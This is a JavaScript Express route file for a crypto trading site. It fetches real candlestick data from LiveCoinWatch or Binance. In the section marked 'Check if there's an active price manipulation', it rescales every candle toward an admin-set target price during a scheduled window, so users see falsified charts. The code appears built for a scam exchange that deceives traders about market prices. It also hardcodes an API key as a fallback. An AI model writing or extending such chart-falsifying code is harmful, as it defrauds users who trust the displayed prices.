const express = require('express');
const axios = require('axios');
const MarketPrice = require('../MarketPrice');
const router = express.Router();

// LiveCoinWatch default key (falls back to provided key if env not set)
const LCW_API_KEY = process.env.LIVECOINWATCH_API_KEY || '1b0809f9-08d7-4326-9446-4e2e34150f9a';
const LCW_HISTORY_URL = 'https://api.livecoinwatch.com/coins/single/history';

// Fetch klines (candlestick) data from Binance
router.get('/klines', async (req, res) => {
  const { symbol, interval, limit } = req.query;
  // Normalize symbol (accept both BTCUSDT and BTC/USDT from clients)
  const normalizedSymbol = (symbol || '').replace('/', '').toUpperCase();
  console.log(`[CHARTS] Received request for ${symbol} (normalized: ${normalizedSymbol}) with interval ${interval}`);

  // Validate required parameters
  if (!symbol || !interval) {
    return res.status(400).json({ message: 'Symbol and interval are required' });
  }

  // Validate interval
  const validIntervals = ['1m', '5m', '15m', '1h', '4h', '1d', '1w'];
  if (!validIntervals.includes(interval)) {
    return res.status(400).json({ message: 'Invalid interval' });
  }

  try {
    // Try LiveCoinWatch history endpoint when key is present and interval supported
    let data = null;
    const intervalToSeconds = {
      '1m': 60,
      '5m': 300,
      '15m': 900,
      '1h': 3600,
      '4h': 14400,
      '1d': 86400,
    };

    if (LCW_API_KEY && Object.prototype.hasOwnProperty.call(intervalToSeconds, interval)) {
      try {
        const step = intervalToSeconds[interval];
        const end = Math.floor(Date.now() / 1000);
        const start = end - (Number(limit || 100) * step);
        const code = (normalizedSymbol || '').replace(/USDT$|USD$/i, '');

        const body = { currency: 'USD', code, start, end, step };
        let lcwResp = null;
        try {
          lcwResp = await axios.post(LCW_HISTORY_URL, body, {
            headers: { 'x-api-key': LCW_API_KEY, 'Content-Type': 'application/json' },
            timeout: parseInt(process.env.PRICE_FETCH_TIMEOUT_MS || '5000', 10),
          });
        } catch (err) {
          console.error('[CHARTS] LiveCoinWatch history request failed:', err?.message || err);
          lcwResp = null;
        }

        if (lcwResp && lcwResp.data) {
          let payload = lcwResp.data;
          if (payload.data) payload = payload.data;

          // payload may be array-of-arrays [[ts, o, h, l, c, v], ...] or array-of-objects
          if (Array.isArray(payload) && payload.length > 0) {
            if (Array.isArray(payload[0])) {
              data = payload.map((c) => [Number(c[0]) < 1e12 ? Number(c[0]) * 1000 : Number(c[0]), c[1].toString(), c[2].toString(), c[3].toString(), c[4].toString(), (c[5] || '0').toString()]);
            } else if (typeof payload[0] === 'object') {
              data = payload.map((o) => {
                const tsRaw = o.time || o.t || o.timestamp || o[0];
                let ts = Number(tsRaw || 0);
                if (ts && ts < 1e12) ts = ts * 1000;
                return [ts, (o.open || o.o || o.O || 0).toString(), (o.high || o.h || o.H || 0).toString(), (o.low || o.l || o.L || 0).toString(), (o.close || o.c || o.C || 0).toString(), (o.volume || o.v || 0).toString()];
              });
            }
          }
        }
      } catch (err) {
        console.error('[CHARTS] LiveCoinWatch processing error:', err?.message || err);
      }
    }

    // If LCW didn't provide data, fall back to Binance
    if (!data) {
      // Construct the Binance API URL
      const binanceUrl = 'https://api.binance.com/api/v3/klines';

      // Fetch data from Binance (use normalized symbol)
      const response = await axios.get(binanceUrl, {
        params: {
          symbol: normalizedSymbol,
          interval: interval,
          limit: limit || 100,
        },
      });

      data = response.data;
      console.log(`[CHARTS] Fetched ${data.length} candles from Binance.`);
    }

    // Check if there's an active price manipulation for this symbol
    const marketPrice = await MarketPrice.findOne({ symbol: normalizedSymbol });
    let manipulatedData = data;
    if (marketPrice && marketPrice.manipulation) {
      const manip = marketPrice.manipulation || {};
      // Support both Date objects and numeric timestamps
      const startTime = manip.startTime ? new Date(manip.startTime) : null;
      const endTime = manip.endTime ? new Date(manip.endTime) : null;
      const now = new Date();

      if (manip.isActive && startTime && endTime && now >= startTime && now <= endTime) {
        console.log('[CHARTS] Active manipulation found for symbol:', normalizedSymbol);
        console.log('[CHARTS] Manipulation is currently active. Scaling entire chart...');

        if (data && data.length > 0) {
          const totalDuration = endTime - startTime;
          const timeSinceStart = now - startTime;
          const progress = totalDuration > 0 ? Math.min(timeSinceStart / totalDuration, 1) : 1;

          // Determine a safe start price and target price with fallbacks
          const lastCandle = data[data.length - 1];
          const originalLastClose = lastCandle ? parseFloat(lastCandle[4]) : marketPrice.price || 1;

          const startPrice = (typeof manip.originalPrice === 'number' && !isNaN(manip.originalPrice))
            ? manip.originalPrice
            : (marketPrice.price || originalLastClose);

          const targetPrice = (typeof manip.endValue === 'number' && !isNaN(manip.endValue))
            ? manip.endValue
            : startPrice;

          const priceDifference = targetPrice - startPrice;
          const currentManipulatedPrice = startPrice + (priceDifference * progress);

          console.log(`[CHARTS] Current manipulation progress: ${Math.round(progress * 100)}%`);
          console.log(`[CHARTS] Current ideal manipulated price: ${currentManipulatedPrice}`);

          // Calculate scale ratio based on last close
          const ratio = originalLastClose > 0 ? currentManipulatedPrice / originalLastClose : 1;
          console.log(`[CHARTS] Scaling ratio to apply to chart: ${ratio}`);

          manipulatedData = data.map((candle) => {
            // Safely parse numeric OHLC values and apply ratio
            const o = parseFloat(candle[1]) || 0;
            const h = parseFloat(candle[2]) || 0;
            const l = parseFloat(candle[3]) || 0;
            const c = parseFloat(candle[4]) || 0;

            return [
              candle[0], // timestamp
              (o * ratio).toString(),
              (h * ratio).toString(),
              (l * ratio).toString(),
              (c * ratio).toString(),
              candle[5], // volume
            ];
          });

          console.log(`[CHARTS] Finished scaling all ${data.length} candles based on active manipulation.`);
        }
      } else {
        console.log('[CHARTS] No active manipulation window currently for symbol:', normalizedSymbol);
      }
    } else {
      console.log('[CHARTS] No manipulation configuration found for symbol:', normalizedSymbol);
    }

    // Format the data for lightweight-charts and include ISO timestamp
    const formattedData = manipulatedData.map((d) => ({
      time: Math.floor(d[0] / 1000), // seconds
      timestamp: new Date(d[0]).toISOString(),
      open: parseFloat(d[1]),
      high: parseFloat(d[2]),
      low: parseFloat(d[3]),
      close: parseFloat(d[4]),
      volume: parseFloat(d[5]) || 0,
    }));

    res.json({ symbol, interval, data: formattedData });
  } catch (error) {
    console.error('Error fetching klines data:', error?.message || error);
    res.status(500).json({ message: 'Server error fetching chart data', error: error.message });
  }
});

module.exports = router;
